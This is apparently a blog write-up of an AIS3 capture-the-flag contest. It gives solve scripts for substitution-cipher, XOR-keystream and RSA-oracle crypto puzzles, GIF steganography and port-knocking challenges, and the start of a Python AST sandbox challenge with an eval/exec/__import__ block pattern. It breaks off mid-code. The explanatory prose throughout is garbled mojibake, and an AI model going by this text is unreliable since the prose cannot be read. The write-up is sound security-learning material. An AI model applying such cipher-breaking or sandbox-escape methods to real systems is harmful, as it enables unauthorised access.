I"<p>ä»Šå¹´è¶…çˆ½çš„ï¼Œç¬¬ä¸€æ¬¡æ‰“CTFæ¶åˆ°æ’è¡Œæ¦œå‰é¢ï¼Œæ‘¸åˆ°äº†å€‹ç¬¬ä¸ƒåï¼Œæ˜å¹´çœ‹ä¾†è©²å»ä¿®è¨ˆå®‰ã„Œ
<!--description-->
<img src="/assets/img/2022-06-07/image-20220520181523363.png" alt="scoreboard" /></p>

<hr />
<h2 id="crypto">Crypto</h2>

<h3 id="sc">SC</h3>

<p>Substitution Cipher? ç›´æ¥pythoné–‹å€‹dictionaryå°ä¸€å°æ‡‰è©²å°±å¯ä»¥è§£äº†ã„…</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"cipher.py"</span><span class="p">,</span><span class="s">'r'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
<span class="n">e</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"cipher.py.enc"</span><span class="p">,</span><span class="s">'r'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>

<span class="n">dct</span> <span class="o">=</span> <span class="p">{}</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)):</span>
    <span class="n">dct</span><span class="p">[</span><span class="n">e</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

<span class="k">print</span><span class="p">(</span><span class="n">dct</span><span class="p">)</span>

<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'flag.txt.enc'</span><span class="p">,</span><span class="s">'r'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">dct</span><span class="p">[</span><span class="n">c</span><span class="p">],</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
</code></pre></div></div>

<p>Flag: <code class="language-plaintext highlighter-rouge">AIS3{s0lving_sub5t1tuti0n_ciph3r_wi7h_kn0wn_p14int3xt_4ttack}</code></p>

<h3 id="fast-cipher">Fast Cipher</h3>

<p>é¡Œç›®çµ¦çš„åŠ å¯†æ–¹æ³•ï¼š</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">M</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="mi">1024</span>
<span class="k">def</span> <span class="nf">f</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="c1"># this is a *fast* function
</span>    <span class="k">return</span> <span class="p">(</span>
        <span class="mi">4</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">4</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">8</span> <span class="o">+</span> <span class="mi">7</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">7</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">6</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">3</span> <span class="o">+</span> <span class="mh">0x48763</span>
    <span class="p">)</span> <span class="o">%</span> <span class="n">M</span>
<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">pt</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="n">ct</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">pt</span><span class="p">:</span>
        <span class="n">ct</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="p">(</span><span class="n">key</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">))</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">f</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">randbelow</span><span class="p">(</span><span class="n">M</span><span class="p">)</span>
    <span class="n">ct</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="n">key</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">ct</span><span class="p">.</span><span class="nb">hex</span><span class="p">())</span>
</code></pre></div></div>

<p>åŸºæœ¬ä¸Šå°±æ˜¯<code class="language-plaintext highlighter-rouge">f(x)</code>å»ç”Ÿä¸€å¤§ä¸²ã€Œéš¨æ©Ÿã€çš„æ±è¥¿ç„¶å¾Œè·Ÿæ˜æ–‡xorï¼Œæ‰€ä»¥æˆ‘å€‘åªè¦æƒ³è¾¦æ³•å»xorå›ä¾†å°±å¯ä»¥äº†ã€‚é€™è£¡çš„é‡é»æ˜¯ <code class="language-plaintext highlighter-rouge">key &amp; 0xFF</code>ï¼Œä¹Ÿå°±æ˜¯èªªkeyæ¯ä¸€å›åˆéƒ½åªéœ€è¦åœ¨ä¹æœ€å¾Œä¸€å€‹byteï¼Œä¹Ÿå°±æ˜¯mod 0x100çš„æ„æ€ã€‚é‚£éº¼é¡¯ç„¶åˆå§‹keyä¸Ÿé€²å»åªæœƒæœ‰256ç¨®å¯èƒ½ï¼Œå°±å…¨éƒ¨è©¦ä¸€éå°±å¥½ï¼Œæˆ‘å€‘ç”šè‡³å¯ä»¥ç›´æ¥æŠŠé¡Œç›®çš„codeã„ã„§ã„¤éä¾†ç”¨:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">f</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="c1"># this is a *fast* function
</span>    <span class="k">return</span> <span class="p">(</span>
        <span class="mi">4</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">4</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">8</span> <span class="o">+</span> <span class="mi">7</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">7</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">6</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">3</span> <span class="o">+</span> <span class="mh">0x48763</span>
    <span class="p">)</span> <span class="o">%</span> <span class="n">M</span>


<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">pt</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="n">ct</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">pt</span><span class="p">:</span>
        <span class="n">ct</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="p">(</span><span class="n">key</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">))</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">f</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x100</span><span class="p">):</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">i</span>
        <span class="n">ct</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x6c\x0e\xc8\x40\xf8\x8d\x4c\xd7\xfc\xc6\xd5\xc6\xd1\xda\xfc\xc1\xca\xd7\xd0\xfc\xc2\xd1\xc6\xfc\xd6\xd0\xc6\xc7\xfc\xcf\xcc\xcf\xde</span><span class="s">"</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span> <span class="c1"># é¡Œç›®çµ¦çš„å¯†æ–‡
</span>        <span class="k">if</span> <span class="nb">str</span><span class="p">(</span><span class="n">ct</span><span class="p">).</span><span class="n">isprintable</span><span class="p">():</span>
            <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ct</span><span class="p">))</span>
</code></pre></div></div>

<p>Flag (é‚„æ˜¯è¦grepä¸€ä¸‹AIS3): <code class="language-plaintext highlighter-rouge">AIS3{not_every_bits_are_used_lol}</code></p>

<h3 id="really-strange-oracle">Really Strange orAcle</h3>

<blockquote>
  <p>You have a RSA(-like) encryption oracle to  use, but you know literally nothing about the public key. Can you still  decrypt the flag with it?</p>
</blockquote>

<p>é¡Œç›®çµ¦çš„server code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">getStrongPrime</span><span class="p">,</span> <span class="n">getRandomRange</span><span class="p">,</span> <span class="n">isPrime</span><span class="p">,</span> <span class="n">bytes_to_long</span>
<span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">flag</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environb</span><span class="p">[</span><span class="sa">b</span><span class="s">"FLAG"</span><span class="p">]</span>

<span class="n">keyfile</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s">"./key.json"</span><span class="p">)</span>
<span class="k">if</span> <span class="n">keyfile</span><span class="p">.</span><span class="n">is_file</span><span class="p">():</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">keyfile</span><span class="p">.</span><span class="n">read_text</span><span class="p">())</span>
    <span class="n">n</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="s">"n"</span><span class="p">]</span>
    <span class="n">e</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="s">"e"</span><span class="p">]</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">getStrongPrime</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="n">n</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">p</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">e</span> <span class="o">=</span> <span class="n">getRandomRange</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="o">|</span> <span class="mi">1</span>
        <span class="k">if</span> <span class="n">isPrime</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
            <span class="k">break</span>
    <span class="n">keyfile</span><span class="p">.</span><span class="n">write_text</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"n"</span><span class="p">:</span> <span class="n">n</span><span class="p">,</span> <span class="s">"e"</span><span class="p">:</span> <span class="n">e</span><span class="p">}))</span>

<span class="n">flag</span> <span class="o">+=</span> <span class="n">os</span><span class="p">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">2048</span> <span class="o">//</span> <span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
<span class="n">c</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">x</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">())</span>
    <span class="k">if</span> <span class="n">x</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">))</span>
</code></pre></div></div>

<p>é€™é¡Œç•¶åˆå¡äº†å¾ˆä¹…ï¼Œä½†æ˜¯ç¾åœ¨å›é ­çœ‹çš„è©±å…¶å¯¦å¥½åƒä¹Ÿé‚„å¥½ã€‚é›–ç„¶æ²’çµ¦ä»»ä½•public keyé‚„æ˜¯moduloçš„æ•¸å­—ï¼Œä½†æˆ‘å€‘å¯ä»¥ç”¨serverçš„æœå‹™é RSAçš„æ€§è³ªå»æ¨æ•²å‡ºä¾†ã€‚</p>

<p>é¦–å…ˆä¾†ç®—\(n\)ã€‚å…ˆè®“serverå¹«æˆ‘å€‘ç®— \(2^e, 4^e, 8^e \mod{n}\)ï¼Œç”±æ–¼\((2^e)^2 = 4^e, (2^e)^3 = 8^e\)ï¼Œæ‰€ä»¥ç•¶ç„¶\((2^e)^2-4^e\equiv (2^e)^3-8^e \equiv 0 \mod{n}\)ã€‚ç®—å‡ºé€™å…©å€‹æ±è¥¿ä¹‹å¾Œï¼Œç”±æ–¼ä»–å€‘éƒ½æœƒæ˜¯\(n\)çš„å€æ•¸ï¼Œæ‰€ä»¥ç›´æ¥ç®—gcdæœ‰å¾ˆå¤§çš„æ©Ÿç‡å®ƒå°±æ˜¯\(n\)ã€‚</p>

<p>æ¥ä¸‹ä¾†è§€å¯Ÿé¡Œç›®çš„codeã€‚è·Ÿä¸€èˆ¬RSAæ˜é¡¯ä¸åŒçš„åœ°æ–¹æ˜¯ï¼Œä¸€èˆ¬ä¾†èªªRSAé¸çš„nå¿…é ˆè¦æ˜¯å…©å€‹å¤§è³ªæ•¸\(p,q\)çš„ä¹˜ç©ï¼Œç„¶è€Œé€™è£¡å»ç›´æ¥ç”¨äº†\(p^2\)ï¼Œæ–¼æ˜¯æˆ‘å€‘å¯ä»¥ç›´æ¥æŠŠä¸Šé¢çš„\(n\)ä¸Ÿå»ç¶²è·¯è¨ˆç®—æ©Ÿç®—å€‹sqrtï¼Œå°±å¯ä»¥å¾—åˆ°\(p\)ã€‚ä½†æ˜¯\(e\)è¦æ€éº¼ç®—ï¼Ÿ é€™è£¡æˆ‘å¡äº†å¾ˆä¹…ï¼Œä¸éå•äº†ä½œè€…å¾Œï¼Œä»–æç¤ºèªªæ˜¯ä¸€äº›æ•¸å­¸ï¼Œæ‰€ä»¥æƒ³ä¸€ä¸‹ä¹‹å¾Œå¯ä»¥ç™¼ç¾\(n=p^2\)é€™å€‹æ±è¥¿çš„å·¨å¤§ç¼ºé™·ï¼š</p>

\[\begin{align}
(p+1)^e&amp;=C^e_0p^e+C^e_1p^{e-1}\dots+C^e_{e-2}p^2+C^e_{e-1}p+1 &amp;\mod{p^2} \\
&amp;= pe+1 &amp;\mod{p^2}
\end{align}\]

<p>æ–¼æ˜¯å‚³\(p+1\)çµ¦serverä¹‹å¾Œï¼Œæ‹¿ä¸‹ä¾†-1é™¤ \(p\) æˆ‘å€‘å°±å¾—åˆ°äº† \(e\)ã€‚æ›å›\(d\)ä¹‹å¾Œå°±å¯ä»¥æ‹¿ä¾†è§£å¯†äº†ï¼Œä¸éé€™è£¡æœ‰ä¸€é»è¦æ³¨æ„çš„æ˜¯\(\phi(p^2)=p^2-p\)ï¼Œæ‰€ä»¥è¦æ‹¿é€™å€‹ä¾†ç®—modular inverseã€‚</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">AIS3{math_go_brrrrr...}</code></p>

<hr />
<h2 id="misc">Misc</h2>

<h3 id="gift-in-the-dream">Gift in the dream</h3>

<p>é¡Œç›®çµ¦äº†ä¸€å¼µé–ƒçˆä¸å®šçš„GIFï¼š</p>

<p><img src="/assets/img/2022-06-07/gift_in_the_dream.gif" alt="gift_in_the_dream" /></p>

<p>æ€éº¼çœ‹éƒ½æ˜¯æŠŠFlagè—åœ¨é–ƒçˆæ™‚é–“è£¡é ­ï¼Œgoogleä¸€ä¸‹å¯ä»¥æ‰¾åˆ°é…·é…·çš„å·¥å…·<code class="language-plaintext highlighter-rouge">exiftool</code>ï¼Œå°±èƒ½æŠŠæ¯å€‹frameçš„æ™‚é–“æŠ“å‡ºä¾†ï¼Œå®ƒç”šè‡³é‚„ç›´æ¥æç¤ºæˆ‘å€‘æ™‚é–“å°±æ˜¯ç­”æ¡ˆ:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Graphic Control: delay=0.65
  Comment = why is the animation lagging? why is the duration so weird? is this just a dream?
Application Extension: NETSCAPE/2.0
  + [BinaryData directory, 3 bytes]
  | AnimationIterations = 0
Image: left=0 top=0 width=200 height=200
Graphic Control: delay=0.73
  Comment = why is the animation lagging? why is the duration so weird? is this just a dream?
Application Extension: NETSCAPE/2.0
  + [BinaryData directory, 3 bytes]
  | AnimationIterations = 0
Image: left=97 top=97 width=7 height=7
Graphic Control: delay=0.83
  Comment = why is the animation lagging? why is the duration so weird? is this just a dream?
Application Extension: NETSCAPE/2.0
  + [BinaryData directory, 3 bytes]
  | AnimationIterations = 0
Image: left=94 top=94 width=13 height=13
Graphic Control: delay=0.51
</code></pre></div></div>

<p>æŠ“å‡ºä¾†ä¹‹å¾Œå¾—åˆ°çš„æ•¸å€¼æ˜¯<code class="language-plaintext highlighter-rouge">[65,73,83,51,123,53,84,51,103,110,48,103,82,52,112,72,121,95,99,52,78,95,98,51,95,102,85,110,95,115,48,109,51,55,105,77,101,125]</code>ã€‚ASCIIæ›ä¸€ä¸‹å°±å¾—åˆ°Flag: <code class="language-plaintext highlighter-rouge">AIS3{5T3gn0gR4pHy_c4N_b3_fUn_s0m37iMe}</code></p>

<h3 id="knock">Knock</h3>

<p>é¡Œç›®çµ¦äº†ä¸€å€‹æœå‹™ï¼ŒæŠŠè¦æ±‚çš„tokenè²¼ä¸Šå»ä¹‹å¾Œå®ƒæœƒèªª <code class="language-plaintext highlighter-rouge">I have knocked on [IP]</code>ã€‚äº‚çŒœgoogleäº†ä¸€ä¸‹knock networkingä¹‹é¡çš„é—œéµå­—å¯ä»¥æ‰¾åˆ° <a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a> é€™å€‹æ±è¥¿ã€‚é–‹wiresharkä¹‹å¾Œæˆ‘å€‘å¯ä»¥åµæ¸¬æ¯”è³½ç”¨vpnä¸Šé¢çš„trafficï¼Œå†å«å®ƒknockä¸€æ¬¡ï¼š</p>

<p><img src="/assets/img/2022-06-07/image-20220520143848915.png" alt="image-20220520143848915" /></p>

<p>ç¨å¾®è™•ç†ä¸€ä¸‹port numberå¾—åˆ° Flag: <code class="language-plaintext highlighter-rouge">AIS3{kn0ckKNOCKknock}</code></p>

<h3 id="astjail">ASTJail</h3>

<p>é€™é¡ŒçœŸçš„ååˆ†æ„å¤–æ‹¿åˆ°äº†é¦–æ®ºï¼Œè€Œä¸”é‚„ç¶­æŒå”¯ä¸€è§£ä¸€æ•´å¤©ï¼Œæ˜æ˜æˆ‘æ˜¯è³‡å®‰å°å»¢ç‰©@_@</p>

<p>åŸé¡Œç›®code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">ast</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">from</span> <span class="nn">code</span> <span class="kn">import</span> <span class="n">InteractiveConsole</span>

<span class="n">WHITE_LIST</span> <span class="o">=</span> <span class="p">[</span><span class="s">'print'</span><span class="p">,</span> <span class="s">'bool'</span><span class="p">,</span> <span class="s">'int'</span><span class="p">,</span> <span class="s">'float'</span><span class="p">,</span> <span class="s">'str'</span><span class="p">,</span> <span class="s">'len'</span><span class="p">,</span> <span class="s">'pow'</span><span class="p">,</span>
              <span class="s">'abs'</span><span class="p">,</span> <span class="s">'min'</span><span class="p">,</span> <span class="s">'max'</span><span class="p">,</span> <span class="s">'sum'</span><span class="p">,</span> <span class="s">'chr'</span><span class="p">,</span> <span class="s">'ord'</span><span class="p">,</span> <span class="s">'hex'</span><span class="p">,</span> <span class="s">'oct'</span><span class="p">,</span> <span class="s">'bin'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
    <span class="c1"># Python ast: https://docs.python.org/3.10/library/ast.html
</span>    <span class="k">def</span> <span class="nf">traverse</span><span class="p">(</span><span class="n">node</span><span class="p">):</span>
        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">Expression</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">traverse</span><span class="p">(</span><span class="n">node</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>
        <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">Name</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">node</span><span class="p">.</span><span class="nb">id</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">WHITE_LIST</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">'[!] Forbidden function: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">node</span><span class="p">.</span><span class="nb">id</span><span class="p">))</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">return</span> <span class="bp">True</span>
        <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">Call</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">traverse</span><span class="p">(</span><span class="n">node</span><span class="p">.</span><span class="n">func</span><span class="p">)</span> <span class="ow">and</span> \
                <span class="nb">all</span><span class="p">(</span><span class="n">traverse</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span> <span class="k">for</span> <span class="n">arg</span> <span class="ow">in</span> <span class="n">node</span><span class="p">.</span><span class="n">args</span><span class="p">)</span> <span class="ow">and</span> \
                <span class="nb">all</span><span class="p">(</span><span class="n">traverse</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">node</span><span class="p">.</span><span class="n">keywords</span><span class="p">)</span>
        <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">BoolOp</span><span class="p">):</span>
            <span class="k">return</span> <span class="nb">all</span><span class="p">(</span><span class="n">traverse</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">node</span><span class="p">.</span><span class="n">values</span><span class="p">)</span>
        <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">BinOp</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">traverse</span><span class="p">(</span><span class="n">node</span><span class="p">.</span><span class="n">left</span><span class="p">)</span> <span class="ow">and</span> <span class="n">traverse</span><span class="p">(</span><span class="n">node</span><span class="p">.</span><span class="n">right</span><span class="p">)</span>
        <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">UnaryOp</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">traverse</span><span class="p">(</span><span class="n">node</span><span class="p">.</span><span class="n">operand</span><span class="p">)</span>
        <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">Compare</span><span class="p">):</span>
            <span class="k">return</span> <span class="nb">all</span><span class="p">(</span><span class="n">traverse</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">node</span><span class="p">.</span><span class="n">comparators</span><span class="p">)</span> <span class="ow">and</span> <span class="n">traverse</span><span class="p">(</span><span class="n">node</span><span class="p">.</span><span class="n">left</span><span class="p">)</span>
        <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">List</span><span class="p">):</span>
            <span class="k">return</span> <span class="nb">all</span><span class="p">(</span><span class="n">traverse</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">node</span><span class="p">.</span><span class="n">elts</span><span class="p">)</span>
        <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">Tuple</span><span class="p">):</span>
            <span class="k">return</span> <span class="nb">all</span><span class="p">(</span><span class="n">traverse</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">node</span><span class="p">.</span><span class="n">elts</span><span class="p">)</span>
        <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">Subscript</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">traverse</span><span class="p">(</span><span class="n">node</span><span class="p">.</span><span class="n">value</span><span class="p">)</span> <span class="ow">and</span> <span class="n">traverse</span><span class="p">(</span><span class="n">node</span><span class="p">.</span><span class="nb">slice</span><span class="p">)</span>
        <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">Slice</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">traverse</span><span class="p">(</span><span class="n">node</span><span class="p">.</span><span class="n">lower</span><span class="p">)</span> <span class="ow">and</span> <span class="n">traverse</span><span class="p">(</span><span class="n">node</span><span class="p">.</span><span class="n">upper</span><span class="p">)</span>
        <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">ast</span><span class="p">.</span><span class="n">Constant</span><span class="p">)</span> <span class="ow">or</span> <span class="n">node</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">True</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"[!] Forbidden node type:"</span><span class="p">,</span> <span class="nb">type</span><span class="p">(</span><span class="n">node</span><span class="p">).</span><span class="n">__name__</span><span class="p">)</span>
            <span class="k">return</span> <span class="bp">False</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'eval|exec|__import__'</span><span class="p">,</span> <span class="n">code</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"[!] Seems unsafe..."</span><span class="p">)</span>
            <span class="k">return</span> <span class="bp">False</span>
        <span class="n">tree</span> <span class="o">=</span> <span class="n">ast</span><span class="p">.</span><span class="n">parse</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s">'eval'</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">traverse</span><span class="p">(</span><span class="n">tree</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">SyntaxError</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[!] Syntax error"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="k">class</span> <span class="nc">Sandbox</span><span class="p">(</span><span class="n">InteractiveConsole</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">runsource</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">source</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">filename</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s">"&lt;input&gt;"</span><span class="p">,</span> <span class="n">symbol</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s">"single"</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">source</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">check</span><span class="p">(</span><span class="n">source</span><span class="p">):</span>
            <span class="k">return</span> <span class="bp">False</span>
        <span class="k">return</span> <span class="nb">super</span><span class="p">().</span><span class="n">runsource</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="n">filename</span><span class="p">,</span> <span class="n">symbol</span><span class="o">=</span><span class="n">symbol</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
